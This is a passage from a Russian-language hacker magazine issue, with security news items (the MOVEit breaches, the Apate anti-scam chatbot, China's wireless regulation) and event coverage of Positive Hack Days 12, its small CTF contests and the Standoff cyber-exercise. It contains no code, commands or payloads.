          через свои инструментарии в софте или „железе“ на стадии производства.
           Поэтому  степень и  скорость внедрения  технологии будет  небыстрой,  так
           как объем производства „железа“ в России невелик», — сообщил Свинцов,
          добавив,  что в  настоящее  время механизм  реализации  безопасной сети
           обсуждается с профессиональным сообществом — «операторами связи, про‐
           изводителями российских чипов и „железа“ и компаниями — разработчиками
           софта по кибербезопасности».

 ЧАТ-БОТ БУДЕТ
 ОБЩАТЬСЯ
 С МОШЕННИКАМИ





   Группа специалистов из австралийского Университета Маккуори разрабаты‐
   вает чат‑бота Apate, который сможет выдавать себя за человека и общаться
  с телефонными мошенниками. Основной задачей этого ИИ‑помощника будет
  умышленное затягивание разговоров, чтобы мошенники потратили как можно
   больше времени.
      Ученые говорят, что их главная цель — вовлечь мошенников в разговор
  и вынудить потратить время впустую, тем самым снижая количество таких
   звонков.

         «Так  мы  можем  разрушить  их  бизнес‑модель  и  значительно
         усложнить им процесс зарабатывания денег», — уверяют разработ- «
         чики Apate.                 »
  Этот проект был придуман после того, как профессор Университета Мак‐
  куори Дали Каафар (Dali Kaafar) ответил на звонок скамеров и сумел продер‐
  жать мошенника на линии целых сорок минут, развлекая этим своих детей
  за обедом. После этого Каафар быстро пришел к выводу, что, хотя троллить
  мошенников может быть забавно, на это уходит очень много времени.

        «Я стал думать о том, что мы могли бы автоматизировать этот про-
         цесс и использовать обработку естественного языка для создания «
          компьютеризированного  чат‑бота,  который  мог бы  вести  прав-
         доподобные диалоги с мошенниками», — пишет ученый.                 »
  В итоге на свет появился чат‑бот Apate, названный в честь Апаты — древ‐
   негреческой богини лжи и обмана. По сути, этот чат‑бот использует тех‐
   нологии, схожие с ChatGPT, и сочетает это с клонированием человеческого
   голоса, чтобы создать убедительный «муляж человека», предназначенный
  для ведения долгих разговоров со злоумышленниками.





   Каафар и его коллеги обучали Apate на стенограммах реальных разговоров
  с мошенниками, взятых из телефонных звонков, электронных писем и сооб‐
  щений в социальных сетях. Также исследователи тестировали Apate на реаль‐
  ных мошенниках. Чтобы скамеры звонили им почаще, исследователи раз‐
  мещали свои телефонные номера‑ханипоты по всему интернету, умышленно
   загружали их в спам‑приложения, публиковали на сайтах.
     Основная цель проекта — сделать Apate достаточно «умным», чтобы он
  мог продержать мошенника на линии сорок минут, как это сделал сам
  Каафар. В настоящее время боту удается поддерживать диалог всего пять
   минут, но исследователи говорят, что он делает успехи.

       «Мы обнаружили, что бот довольно хорошо реагирует на некоторые
         сложные ситуации, с которыми мы не ожидали  справиться,  когда «
         мошенники запрашивают информацию, для которой мы не обучали
          бота, но он адаптируется и выдает очень правдоподобные ответы», —
           рассказывает Каафар.                 »
  По мнению ученых, скоро мошенники тоже создадут, обучат и внедрят в про‐
  цесс скама собственных чат‑ботов, которые будут общаться с чат‑ботами,
   принадлежащими поставщикам телекоммуникационных услуг. Отмечается,
   что сами исследователи уже ведут переговоры по поводу Apate с рядом
   телекоммуникационных провайдеров.


  400 000 ПИРАТСКИХ РЕСУРСОВ ЗАБЛОКИРОВАЛ
 РОСКОМНАДЗОР
  В первом квартале 2023 года Роскомнадзор заблокировал 400 000 пиратских страниц —
   на 40% больше, чем годом ранее. При этом TelecomDaily сообщает, что количество фильмов
   на таких ресурсах с начала года увеличилось на 20%, а до конца 2023-го база этих сервисов
   вырастет на 70%.

   По словам экспертов, прирост контента происходит за счет расширения ассортимента россий‐
    ского популярного кино и сериалов, новинок зарубежного кино, которые не смогут выйти в про‐
   кат на больших экранах, а также за счет старых кинолент.

 СОТНИ КОМПАНИЙ
 ПОСТРАДАЛИ ИЗ-ЗА
 БАГА В MOVEIT
 TRANSFER





  В начале июня разработчики решения для управления передачей файлов
  MOVEit  Transfer  предупредили об  опасной  0-day-уязвимости CVE-2023-
  34362 в своем  продукте. Сообщалось, что  атаки на этот баг начались
  еще 27 мая 2023 года.



   MOVEit Transfer представляет собой решение для передачи файлов, разработанное Ipswitch,
   дочерней компанией американской корпорации Progress Software. Продукт позволяет компани‐
   ям безопасно обмениваться файлами с партнерами и клиентами, используя SFTP, SCP и HTTP.
   MOVEit  Transfer  предлагается  в  виде  локального  решения,  управляемого  заказчиком,
   и облачной SaaS-платформы, управляемой разработчиком.



  Как выяснилось, злоумышленники использовали уязвимость,  чтобы  раз‐
  мещать на уязвимых серверах кастомные веб‑шеллы, что позволило им
   получить список файлов, хранящихся на сервере, скачать файлы, а также
   похитить учетные данные и секреты учетных записей Azure Blob Storage, вклю‐
   чая параметры AzureBlobStorageAccount, AzureBlobKey и AzureBlobContainer.
      Аналитики Microsoft связали массовые атаки на 0-day с вымогательской
   хакгруппой Clop (она же Lace Tempest, TA505, FIN11 или DEV-0950). И вскоре
   после этого хакеры начали выдвигать требования и вымогать выкуп у постра‐
   давших компаний.
      Интересно, что после того, как уязвимость была исправлена, в MOVEit
   Transfer нашли еще ряд новых критических уязвимостей. Новые баги были
   найдены во время аудита безопасности, который после массовых атак про‐
  вели специалисты компании Huntress.
     К настоящему моменту известно, что в ходе массовых атак на CVE-2023-
  34362 были скомпрометированы сотни компаний. За прошедшие недели
  взлом подтвердили множество пострадавших, среди них компания Zellis, бри‐
   танский поставщик решения для расчета заработной платы и управления
   персоналом, клиентами которой числятся Sky, Harrods, Jaguar, Land Rover,
  Dyson и Credit Suisse. Из‑за взлома Zellis были скомпрометированы данные
   ирландской авиакомпании Aer Lingus, авиакомпании British Airways, BBC, бри‐
   танской аптечной сети Boots.
      Также в начале месяца сообщалось, что взломы и утечки данных затронули
   Университет Рочестера, правительство Новой Шотландии, власти американ‐
   ских штатов Миссури и Иллинойс, BORN Ontario, Ofcam, Extreme Networks,
   Американское терапевтическое общество, нефтегазовую компанию  Shell
  и несколько федеральных агентств США.
     Увы, в конце июня список пострадавших продолжил расширяться. Так,
  об атаке и утечке данных сообщили представители Калифорнийского универ‐
   ситета в Лос‑Анджелесе (UCLA), департамент образования Нью‑Йорка, влас‐
   ти штатов Орегон и Луизиана. Причем у последних хакеры украли данные
  о миллионах водительских прав граждан.
      Также от атаки на баг пострадала Siemens Energy — мюнхенская энер‐
   гетическая компания, в которой работает 91 тысяча человек по всему миру.
   Хотя в настоящее время слива данных еще не произошло, Clop уже включила
  Siemens Energy в число пострадавших на своем сайте в даркнете, а предста‐
   вители компании подтвердили СМИ, что были взломаны в ходе атаки Clop.
    В Siemens Energy подчеркнули, что никакие важные данные не были укра‐
  дены и бизнес‑операции компании не пострадали.





   Вместе с Siemens Energy на сайт Clop был добавлен и другой промышленный
   гигант — французская Schneider Electric, которая занимается энергомаши‐
   ностроением и производит оборудование для энергетических подкомплексов
   промышленных предприятий, объектов  гражданского и жилищного стро‐
   ительства, ЦОД и других отраслей.
    В Schneider Electric заявляют, что после известий об уязвимости в MOVEit
   Transfer в компании «оперативно развернули доступные средства для защиты
   данных и инфраструктуры». В настоящее время ИБ‑специалисты компании
   расследуют последствия инцидента и заявления Clop о краже данных.


 ДАННЫЕ ПРОДОЛЖАЮТ УТЕКАТЬ

   По  статистике  команды  сервиса  Kaspersky  Digital  Footprint  Intelligence,  в  январе —
   мае 2023 года зафиксировано на 33% больше случаев публикаций значимых баз данных рос‐
   сийских компаний по сравнению с аналогичным периодом прошлого года.

   За пять месяцев 2023 года на специализированных форумах было обнаружено 197 000 000
   строк пользовательских данных. Из них 81 000 000 строк содержал номера телефонов,
   а 23 000 000 — пароли.

   Чаще всего размещенные на специализированных площадках сообщения указывали на утечки
   из сферы ретейла, IT и финансов  (в начале прошлого года «лидировали» рестораны
   и онлайн‑сервисы).





   Злоумышленники чаще используют для публикации сообщений об утечках Telegram, а не хакер‐
   ские форумы. Также они стараются быстрее сделать данные публичными: почти 50% сооб‐
   щений об утечках данных были опубликованы в течение месяца после похищения данных.

 КИТАЙ ОГРАНИЧИТ
 BLUETOOTH И WI-FI
 ВНУТРИ СТРАНЫ





   Правительство Китая работает над законопроектом, который будет регули‐
  ровать использование беспроводных технологий, включая Bluetooth и Wi-Fi,
  на территории страны.
      Законопроект требует от операторов Bluetooth, Wi-Fi и любого другого
  вида ad hoc, mesh и беспроводных сетей внедрять системы мониторинга дан‐
   ных, «продвигать основные социалистические ценности» и «придерживаться
   правильных политических направлений».
      Пользователи, в свою очередь, должны будут «принимать меры для пре‐
   дотвращения производства, копирования или распространения нежелатель‐
  ной информации и противодействия ей». В случае получения такой информа‐
  ции рекомендуется обращаться в компетентные органы.
      Государственная канцелярия интернет‑информации КНР (CAC) уже под‐
   готовила соответствующие рекомендации, адресовав их операторам «ad hoc
  сетей ближней связи», то есть провайдерам, которые могут использовать
   локальные сети для продвижения несоциалистических ценностей или кон‐
   тента, нарушающего законы страны.
      Ожидается, что операторы таких сетей должны будут «предотвращать
  и противостоять» использованию своего оборудования для распространения
  фальшивых новостей и незаконного контента, сразу сообщая о таких дей‐
   ствиях властям.
      Пользователи сетей должны будут предоставлять данные о своей реаль‐
  ной личности, а сетевые операторы — собирать информацию обо всех поль‐
   зователях, подключающихся к их сети, и передавать ее властям по запросу.
   Кроме того, операторы будут обязаны показывать предупреждения поль‐
   зователям, напоминая им не  злоупотреблять сетевой  инфраструктурой
  и отговаривая их от противоправных действий. Также операторов обязуют
   подготовить план действий на случай непредвиденных обстоятельств.
    При этом в документе CAC нет никаких указаний на то, распространяется
  ли этот план только на коммерческих операторов или затрагивает и вообще
  любые точки доступа Wi-Fi.
      Также не до конца ясно, почему в документе упоминаются сети Bluetooth.
   Предполагается, что это может быть признаком того, что власти Китая пла‐
   нируют контролировать вообще любые peer-to-peer-сети, подобные AirDrop
   от Apple. Ведь именно AirDrop активно использовался в Китае во время
   недавних массовых протестов, связанных с COVID-ограничениями.


  ДРУГИЕ ИНТЕРЕСНЫЕ СОБЫТИЯ МЕСЯЦА


   Роскомнадзор заблокировал Medium


   Серверные процессоры AMD EPYC 7002 зависают после 1044 дней работы


   На орбиту доставлен спутник Moonlighter, который взломают на DEF CON


    Ради доступа к GPT-4 люди воруют плохо защищенные ключи API


    Десятки модов для Minecraft заражены малварью Fracturiser


   Хакеры из KillNet и Anonymus Sudan заявили об атаке на Европейский инвестиционный банк


  В Госдуме предложили создать файлообменники для пиратского контента из недружественных
   стран


   Western Digital напугала пользователей, посоветовав сменить HDD после трех лет работы


    Исследователи предложили использовать электромагнитные атаки для взлома дронов


   ChatGPT и Google Bard генерируют ключи для Windows 11 Pro и 10 Pro
COVERSTORY





        КАК ХАКЕРЫ НАВОДНИЛИ
           ПАРК ГОРЬКОГО





В конце мая прошел двенадцатый форум
по информационной безопасности Positive
Hack  Days,  организованный  компанией
Positive Technologies и получивший в этом
году  тематическое  название  «Доверие              FearZzZz                                                                                Непрерывно двигайся. Ад
к технологиям». Локацию для проведения      пожирает праздных. AppSec,                                                                             Bug Bounty, Legal Hacking.
мероприятия выбрали очень интересную —       Telegram channels:@lockpick@razehell,
парк Горького, один из популярнейших пар‐        vladfearzzzz@gmail.com
ков Москвы. Необычно? Весьма. Интерес‐
но? Да!





Два дня PHD — это более сотни выступлений специалистов и экспертов
в области  информационной  безопасности,  представителей  ИТ‑бизнеса
и энтузиастов. Это разнообразные конкурсы и активности, неформальное
общение с коллегами и старыми друзьями, а также эпичная битва между
«красными» и «синими» за цифровое «Государство F» — Standoff.
  За эти два дня эксперты и энтузиасты успели обсудить все, что их заботи‐
ло: переход государственных структур и частного бизнеса к так называемой
результативной безопасности; всевозможные способы выстраивания сооб‐
щества вокруг актуальных задач; безопасную разработку; не обошли вни‐
манием OSINT/GEOINT; много говорили про багбаунти и даже порассуждали
на тему «что есть киберпанк».





Нетипичное место проведения форума в этом году позволило реализовать
интересную задумку: сделать закрытую часть форума, куда вход возможен
только по заранее приобретенным билетам, и отдельную зону, доступную
всем посетителям парка.





Про цену входного билета в закрытую зону и очереди на открытии PHDays,
наверное, не написал только ленивый. Да, билет стоит денег. Да, на мероп‐
риятии такого масштаба будут очереди. Внезапно, правда? Именно поэтому
люди приходят пораньше! В этот раз некоторые особенно нетерпеливые
даже нашли обходные пути — что с хакеров взять!
   Что до цены на билет, то если твой работодатель не возьмет ее на себя, то
всегда есть возможность стать спикером или участвовать в многочисленных
конкурсах. Здесь с годами ничего не изменилось, и шансы получить проходку
были, есть и будут, так что не сиди сложа руки в ожидании чуда.





ОТКРЫТАЯ ЗОНА

Куда интереснее в этот раз дела обстояли с самой площадкой. Платная
и бесплатная зоны форума были так сильно разделены, что это создавало
необычное впечатление. Причем не только у участников PHD, но и у посети‐
телей парка, которые зачастую не понимали, что вообще происходит.
   Особое внимание беззаботно прогуливающихся по парку людей прив‐
лекали инсталляция «Троян vs кибер‑Георгий» и главная сцена PHD, которая
выдавала самый мощный звук во всей округе. Парк развлечений «Скамото‐
пия» тоже не пустовал, а «кибербомжи» так вжились в свои роли, что отпу‐
гивали некоторых прохожих.
  PHD в этом году представлял собой целый кибергород, наполненный раз‐
ными футуристичными инсталляциями, которые символизировали актуальные
цифровые угрозы. Эти арт‑объекты должны были помочь гражданам разоб‐
раться в устройстве современного цифрового мира, попутно повышая их
осведомленность об угрозах.
   Например, инсталляция «Троян vs кибер‑Георгий» увлекала зрителей
информацией о фишинге и ловушках в социальных сетях и приложениях
для знакомств, а «Шоссе киберэнтузиастов» — это взломанная хакерами
система умного перекрестка, полностью контролирующая трафик и работу
светофоров. По сценарию это в итоге привело к крупной аварии на одной
из самых оживленных улиц кибергорода.
   «Скамотопия» — парк развлечений, управляемый эксцентричным хозя‐
ином. На территории «Скамотопии» — множество аттракционов, там же про‐
ходило цирковое шоу. Звучит безобидно, но «Скамотопия» была пропитана
обманом, и существовал риск попасться на уловки мошенников.
   Рядом с парком развлечений зона «Маски» — это те самые кибербомжи.
В прошлом они — крутые менеджеры корпораций, но успешные фишинговые
атаки лишили их всего, и теперь они обитают на улицах кибергорода, предос‐
терегая граждан от попадания во всевозможные мошеннические схемы. Тем,
кто был готов от теории перейти к практике и помочь исследователям
безопасности защитить кибергород от хакеров, выпадал шанс пройти спе‐
циальный квест и получить призы.
   Участникам конференции, конечно, все это было в радость. Ну а гуля‐
ющие, думаю, должны были почувствовать, что застали нечто необычное.
Интригующие инсталляции, причудливые образы, внезапные ситуации —
не за этим ли ходят в парки развлечений? Было ли это особой задумкой орга‐
низаторов или же  стало побочным эффектом  выбранного  формата, я
не знаю. Но происходящее выглядело неординарно, может быть, у кого‑то
и пробудило интерес к технологиям!





                                     Продолжение статьи →
COVERSTORY            ← НАЧАЛО СТАТЬИ
POSITIVE HACK DAYS 12
             КАК ХАКЕРЫ НАВОДНИЛИ ПАРК ГОРЬКОГО





ЗАКРЫТАЯ ЗОНА

Платная зона в пятницу была переполнена посетителями, так что двигаться
в любую сторону означало стоять в медленной очереди. Сама локация ока‐
залась недостаточно большой для такого мероприятия, и это сказывалось
на всем.
  К стендам партнеров было не протолкнуться; слушать доклад, не заняв
место заранее, можно было, только глядя в спины впереди стоящих посети‐
телей форума, которые, как и я, желали припасть к мудрости спикеров.
При этом в одно ухо влетал шум с улицы и только во второе — пламенный
спич выступающего.
   Бодрости духа придавали сквозняки, на второй день некоторые посети‐
тели свалились из‑за них с простудой. А еще шатры оказались слишком
похожими, и вблизи понять, в каком из них идет интересующая тебя секция
и доклад, можно было, разве что ориентируясь на стенды партнеров, рас‐
положенные напротив.
  На развешанных везде картах не было метки «Вы находитесь здесь»,
поэтому многие теряли драгоценное время на ориентирование, а потом так
до конца и не понимали, куда им пробиваться. Я исключением не стал,
«потеряв» таким образом шатер фасттрека. Зато с помощью трех волонтеров
мероприятия нашел замок Standoff, в котором проходила самая активная,
дерзкая и интересная хакерская движуха с соответствующей 1337-H4X0R-
атмосферой.


             INFO

                        Подробнее о  Standoff ты сможешь  прочитать
                        в отдельном материале, где будут собраны отзы‐
                     вы его участников.





Комьюнити‑зоны  как  таковой  не было  (эта  тенденция была  заметна
еще в 2019 году), и создалось впечатление, будто вся активная часть сооб‐
щества  перекочевала  в  этот самый замок  Standoff.  Да, без  локпика
и hardware-зоны, но нельзя сказать, что люди тут скучали и сидели без дела.
  В этом видится даже какой‑то двойной смысл, ведь под знаменами
Standoff проводятся в том числе и более «приватные» мероприятия: Standoff
Hacks (кстати, первый «Хакс» был 13 мая) и Standoff Talks (уже третий по счету
митап состоялся 14 мая). Иначе говоря, сообщество все равно где‑то рядом,
просто встречается другим составом и в другом формате. Тем, кто не осо‐
бенно тоскует по старым временам, нововведения придутся по вкусу.
  За замком  Standoff были два шатра  бизнес‑секции, которые ничем
не выделялись, кроме курсирующих туда‑сюда официантов с закусками
и обилия посетителей со стаканчиками кофе в руках. В общем, «пиджачная»
зона, где представители компаний делились друг с другом бизнес‑экспер‐
тизой и рассказывали о своих решениях, что в наше время  актуально,
как никогда.





  Традиционный дефейс бейджа стикерами: в этом году усатой мордочкой
  в худи Standoff

В остальном это были приятные встречи с коллегами и камрадами, интерес‐
ные беседы, раздачи мерча, конкурсы и отличное настроение.
   Кстати, о встречах. В канале @BugBountyRu Лука Сафонов опубликовал
совместное  фото  с  Андреем  Левкиным.  Получается,  представители
bugbounty.ru и bugbounty.bi.zone встретились на мероприятии конкурента, что
как бы намекает: все мы ближе друг к другу, чем может показаться.


Малые CTF
Пока FearZzZz ходил по докладам и исследовал разные уголки
конференции,  другой наш  репортер  Геннадий Ковшенин  сос-

редоточился на прохождении разнообразных CTF. Ниже — его

рассказ об одержанных победах и полученных впечатлениях.
   Оказавшись в павильоне Standoff, я первым делом пошел смотреть сорев‐
нование. Тут располагался шикарный макет города F, за который вели битву
красные и синие. К сожалению, со стороны внутренние механизмы игры
не понять. Команда красных час за часом находила флаги, оставляя в пыли
команду синих, которые должны были писать отчеты. Сложилось впечатление,
что синие были нужны только для антуража. В общем, это скорее шоу —
с шумом, дымом и иллюминацией. Никаких технических инсайтов стороннему
наблюдателю здесь не получить.
   Зато вокруг для нас, простых смертных, соорудили несколько CTF помень‐
ше. И именно они захватили мое внимание настолько, что ни на одно выс‐
тупление я так и не попал!
  По опыту знаю, что, если хочешь преодолеть CTF, нужно выложиться
по полной. Я насчитал восемь соревнований, а значит, нужно было выбрать
одно‑два и забить на остальные. Мой выбор пал на Wireless Fuzzy Frenzy.
   Сказалась, наверное, ностальгия по 2006 году и вардрайвингу в малень‐
ком городке, когда 50% сетей были открытыми, а вторая половина была
на WEP и ARP-атаки были наше всё. Предлагалось пять заданий, связанных
с сетями Wi-Fi, и я начал с самых сложных: нам дали картинку отпечатков
на клавиатуре, звук ввода пароля и WEP-хендшейк.
   Старый добрый aircrack-ng и сгенерированные словарики дали пароль. Я
подключился  к сети, просканировал ее и нашел флаг первым. Второе
задание — со скрытой сетью. К сожалению, перехватить название по аутен‐
тификациям не удалось, никто не подключался (и не был подключен к этой
сети),  пришлось  действовать  согласно  заданию,  где  был  CSV-файл
с 10 000 названий сетей и хинт, что наша сетка самая «нормальная». Приш‐
лось чуть‑чуть попытать данжен‑мастера и выяснить, что под нормальностью
понималась частотность символов.
   Накидав небольшой скриптик, я быстро нашел в эфире скрытую сеть, под‐
ключился к ней (пароль был в подсказке к заданию), нашел веб‑сервер с сот‐
ней ссылок на ZIP-файлы. Половина запаролена, вторая — нет. В половине
незапароленных был одинаковый ридми. Этот же ридми был в запароленных
архивах. Known-plaintext-атакой за 40 минут удалось сбрутить пароль.
   Остальные задания были на физический поиск Wi-Fi-трансляторов. Три
штуки — на огромный павильон Standoff. Первый я нашел без труда, для дос‐
тупа ко второму пришлось немного пободаться с охраной, так как он был
в приватной зоне синих на Standoff. Третий, самый сложный, был внутри дру‐
гого CTF (AI Track: Data Breakout), в маленькой комнате с квестом, запись
на который была забита на часы вперед. Пришлось построить глазки (при‐
менить социнженерию!) и попроситься вне очереди на 15 секунд, чтобы най‐
ти вещающий девайс.
   Итог: я занял первое место. Получил невероятно крутой фирменный рюк‐
зак PHDays 12, футболку CTF и квадрокоптер! Плюс всякий мелкий лут — нак‐
лейки, ручки, блокноты.
  CTF с банкоматом $SNATCH и IDS Bypass были к тому времени уже
в разгаре. Догнать соперников я уже не надеялся. Но больше других игрушек
меня манил кассовый аппарат «Азбуки вкуса». По заверению организа‐
торов, это было продакшен‑решение, без явного флага, просто с открытым
баунти. До меня ребята уже получили рутовый доступ к аппарату и наделали
всяких  пакостей. Но моей целью было  найти  удаленную  уязвимость,
которая бы работала без физического доступа к аппарату.
   Немного растолкав под конец первого дня школоту и получив заветные
полчаса с аппаратом в рутовом режиме, я быстренько скачал себе для даль‐
нейшего изучения несколько интересных папок, откуда запускались интерес‐
ные службы.
  К утру второго дня конференции я не спал уже сутки, зато накатал два
репорта для «Азбуки вкуса». За них меня наградили вместе с другими двумя
участниками. Я получил мешок призов и обещание денежного вознаграж‐
дения после проверки репортов.
  А дальше я ждал заветных 16:00, когда стартовал CTF 2drunk2hack, он
же «наливайка». Я подготовился заранее — забронировал слот, подойдя
к организаторам еще утром, а также плотно подкрепился, чтобы алкоголь
хотя бы не сразу ударил в голову.
  Нас было примерно двадцать участников. В самом начале и каждый раунд
(минут десять) мы ломали набор PHP-приложений и пили густую текилу. Фла‐
гов было очень много. На сервере работал WAF, который наказывал штраф‐
ными шотами тех, кто излишне старался. К сожалению, в последнем раунде я
выпал из тройки лидеров и оказался на шестом месте. Получил фирменную
футболку и неровной походкой отправился проходить еще один CTF —
от ребят из UserGate.
  По QR-коду здесь выдали ELF-бинарник, который нужно было сломать
и написать кейген. Я с обеда его крутил‑вертел внутри Radare2, прерываясь
лишь на награждения и «наливайку». Я закончил прохождение к семи вечера,
но организаторов, увы, на месте уже не было. Приз упущен.
  Еще один CTF был с QR-кодами и разными аттракционами в свободной
зоне (баскетбол, видеоигры и прочая ерунда). Сканирование QR-кодов вело
к боту в Telegram, который начислял очки. Очки можно было обменять на при‐
зы.
   Тратить на это время было жалко, но рядом ребята школьного возраста
рубились в игры, не обращая внимания ни на какие коды. Я сфотографировал
парочку кодов, разобрал их и заметил, что они строятся по понятному прин‐
ципу. Оставалось сконструировать нужный URL и получить максимальное
число баллов, что я и сделал. А потом забрал очередные призы.
   Последний CTF был довольно спонтанным и случился прямо под конец
мероприятия. Дело в том, что параллельно шла Moscow Python Conf ++,
а после нее намечалась закрытая афтепати. Для прохода на нее нужно было
заранее получать наклейки по спискам. Очень хотелось попасть и продол‐
жить праздник!
  В получении наклейки по блату мне отказали, но кое‑кто подсказал, что
некоторые заранее напечатали себе фейковые наклейки. У меня принтера
с собой не было, да и подделка стикеров‑проходок — дело нехорошее.
Пришлось вытянуть ползунки наглости на максимум, найти организаторов
и пройти собеседование с главным питонистом. Он взял мой бейдж, увидел,
что я от журнала «Хакер», глянул на меня и сказал: «По нему видно, что он всю
жизнь на питоне фигачит» (он использовал слегка другое слово). Так я
получил заветный флаг, то есть наклейку, и пошел бухать с питонистами.
   Как оказался в отеле — не помню, но после двух суток сна чуть не опоздал
на самолет домой!
 — Геннадий Ковшенин



ИТОГИ

Меньше андеграунда, больше мейнстрима — так я сформулировал общий
тренд, заметный на PHDays. Но я об этом говорю без лишнего воздыхания
по «андеграунду» или презрения к «мейнстриму». Происходит переосмысле‐
ние индустрии ИБ и идей, которыми она живет. Форматы мероприятий сле‐
дуют той же тенденции. Как мне кажется, любое движение — это хорошо.
   Конференция Positive Hack Days живет, развивается и осваивает новые
горизонты, превращаясь, по сути, в киберфестиваль. Да, изменения есть,
и далеко не всем они пришлись по вкусу, но всем не угодить. Эксперимент
с перемещением в парк, на мой взгляд, был интересным, хотя с первого раза
учесть все нюансы и не удалось.
   PHDays объединяет и привлекает самых разных людей. Сотрудников круп‐
ных компаний, госслужащих, матерых хакеров и начинающих безопасников,
а иногда и рядовых пользователей. Инфобез сейчас волнует каждого!
   Кто пришел слушать доклады, набираться знаний и опыта, тот получил
доступ к более чем сотне разнообразных тематических выступлений и живому
общению со спикерами. Кто‑то пришел тусоваться и общаться со своими
коллегами — и тоже успешно справился с этой задачей. Ковбои клавиатур
рубились за цифровое «Государство F» в замке Standoff, а у них под боком
проходили соревнования по традиционной «наливайке», IDS Bypass и другие
конкурсы. В общем, каждый в итоге получил то, за чем пришел.
COVERSTORY





             КАК ПРОШЛИ
     СОРЕВНОВАНИЯ ПО ВЗЛОМУ
             ГОРОДА





Параллельно с конференцией Positive Hack
Days   проходит   хакерское   состязание
Standoff, где участники соревнуются в зах‐
вате или защите городской инфраструк‐
туры. Город, который ждут аварии и тех‐          Польский Кот                                                                                                    brutsky@glc.ru
ногенные катастрофы, — это всего лишь
макет, но хакерские умения понадобятся
настоящие. В этой статье я расскажу о том,
как прошли соревнования Standoff, приуро‐
ченные к PHDays 12.


ЧТО ТАКОЕ STANDOFF

Standoff — это в первую очередь киберучения. Команды атакующих учатся
лучше взламывать реально встречающиеся в жизни системы, а команды
защитников (SOC — Security Operation Center) — своевременно и эффектив‐
но реагировать на действия хакеров.
   Первый Standoff в таком виде, как он есть сейчас, состоялся в 2016 году,
а в 2019-м он впервые покинул пределы России и прошел в Эмиратах. С тех
пор он проводится каждый год, а с 2020 года — целых два раза ежегодно:
весной как часть конференции PHDays и осенью как отдельное сорев‐
нование.





                          Макет игрового города F

Главная фишка Standoff, которая отличает его от любых видов CTF-сорев‐
нований, — это игровое окружение. Тут нет одинаковых сервисов, которые
надо защищать от других игроков, и нет олимпиадных задач. Вместо этого
у тебя есть целый город, который можно атаковать любыми мыслимыми
методами!

      «Я бы не назвал Standoff CTF’ом из‑за того, что он не попадает
      ни под одно его определение. Это скорее новый вид соревнований«
      по кибербезопасности, в котором основной упор делается на ими-
      тацию действий злоумышленника при атаке на компанию», — участник
      из команды Invuls                »

             INFO

                 О том, что такое CTF и какими они бывают, читай
                        в статье «CTF: Capture the Flag. Как взлом стал
                        спортивным состязанием». О том, как организо‐
                         вать свой CTF, ты можешь узнать из статьи «Make
                          the   Flag!  Как   сделать  свои  соревнования
                       для хакеров».


В какой‑то мере Standoff можно назвать симулятором APT, только сложные
и многоуровневые атаки сильно сжаты во времени. Но это и хорошо, ведь
даже эти три‑четыре дня даются игрокам нелегко.
  Сам город существует в виде макетов — можно круглые сутки следить
за ними онлайн или найти их на PHDays в зоне Standoff. Если что‑то случает‐
ся, это видно и на макете. То есть, когда ты пускаешь под откос поезд, он
по‑настоящему сходит с рельсов и ты можешь в прямом эфире наблюдать
за результатами своих (и чужих) атак.





                          Объект водоснабжения

Все объекты — это не просто подделки под реальные системы, а настоящие
SCADA-контроллеры, аналогичные тем, что используются на реальных объ‐
ектах вроде заводов или систем очистки воды. Такой подход позволяет убить
двух зайцев сразу: игроки с обеих сторон получают опыт, максимально приб‐
лиженный к реальному, а службы безопасности потом смогут защитить нас‐
тоящие предприятия от обнаруженных атак.


НОВЫЙ ГОД, НОВЫЙ ГОРОД

В этом году участников ждали семь отраслей, которые есть практически
в каждом государстве:
 • банковская система — несколько банков и платежная система с плас‐
   тиковыми карточками и системой эквайринга;
 • металлоперерабатывающая промышленность — металлургический ком‐
   бинат «МеталлиКО»;
 • логистическая система;
 • менеджмент в лице управляющей компании City (к ней относилась в том
   числе больница);
 • энергетическая система;
 • атомная промышленность (была представлена атомной станцией);
 • нефтегазовая промышленность.





          Организаторы выдали даже настоящие банковские карты!

Где‑то треть инфраструктуры была новой и на прошлых соревнованиях
не встречалась. Среди новинок: атомная станция, больница, банковская сис‐
тема и карточки. Инфраструктуру металлургической и нефтегазовой ком‐
пании тоже серьезно изменили, да и управляющая компания не осталась
прежней. Забегая вперед, скажу, что все отрасли пострадали в ходе атак,
но некоторые объекты оказались настолько большими, что ни одна команда
не смогла исследовать их полностью.


РЕАЛЬНЫЕ УГРОЗЫ

Фактически на Standoff атакующим  представляется возможность своими
руками прикоснуться к самым важным объектам в жизни любого города —
от банка до атомной станции. В реальности такие проделки закончились бы
тюрьмой, но Standoff позволяет попробовать запретный плод без всяких рис‐
ков. Для тех, кому интересно, как это выглядит изнутри, такие киберучения —
идеальная возможность.

      «Во время пентестов реального заказчика никто не даст остановить
      колесо обозрения или сломать атомную станцию. На Standoff есть«
      возможность дойти до конца: украсть деньги, нарушить работу неф-
       теперерабатывающего  завода  или  металлургического  комбината.
      Красным командам это интересно: они могут реализовать большинс-
      тво своих задумок без каких‑либо ограничений», — Антон Калинин,
       руководитель   группы   экспертного   обучения  и   наставничества
       Innostage                »





        Можно остановить эту атомную станцию и не сесть в тюрьму

Хакеры не только нападают на инфраструктуру виртуального города, но и
должны затем написать отчет, иначе не получить баллы (всё как в жизни!).
Такие отчеты помогают защитникам лучше понять, что происходит и как
бороться с такими атаками в будущем.


НЕДОПУСТИМЫЕ СОБЫТИЯ

В Standoff есть так называемые недопустимые события — критичные для биз‐
неса ситуации, при возникновении которых компания‑жертва понесла бы
убытки. Кроме очевидных, вроде остановки ядерного реактора или раз‐
ливания жидкого металла на работников завода, есть и менее зрелищные,
но не менее разрушительные для бизнеса: утечка данных клиентов или рас‐
пространение во внутренней сети вируса‑вымогателя.
   Нужно правильно оформить каждое недопустимое событие и отправить
отчет организаторам — они подтвердят, что событие действительно про‐
изошло, и помогут улучшить отчет, если с ним что‑то не так. Эти события
заранее описаны, так что все команды находятся в равных условиях и не
могут получать баллы за разбушевавшуюся фантазию. А жаль, ведь иногда
заранее определенных рисков не хватает.
   Векторы атак очень сильно напоминают те, что встречаются в реальной
жизни: одни хакерские группировки иногда используют наработки других, и их
совместная атака развивается еще быстрее.


       «Первое недопустимое событие далось достаточно просто: какая‑то
      из команд везде отключила антивирусы на системах, куда можно было«
       добраться через фишинг, и это помогло нам быстро получить доступ
      во многие сети, включая City. А далее по использованным в предыду-
     щих  Standoff  векторам мы  получили  доступ  к  документам  ком-
      пании», — участник из команды Invuls
       «Мы  быстро  сориентировались  благодаря  опыту  предыдущих
      соревнований и с наскоку остановили гидроэлектростанцию», — учас-
